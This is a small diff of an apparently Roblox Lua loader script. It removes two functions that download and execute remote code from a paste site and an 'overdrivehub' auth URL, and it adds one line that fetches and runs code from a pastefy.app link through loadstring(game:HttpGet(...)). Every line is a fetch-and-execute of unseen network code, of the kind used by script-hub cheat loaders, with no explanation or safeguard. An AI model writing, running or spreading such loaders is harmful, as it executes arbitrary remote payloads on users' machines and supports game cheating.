@@ -1,8 +1,1 @@
-local function s1() 
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/BY4dzs8lcP/0", true))() 
-end 
-local function s2() 
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
-end
-task.spawn(s1)
-task.spawn(s2)
+loadstring(game:HttpGet("https://pastefy.app/POxv9fyD/raw"))()
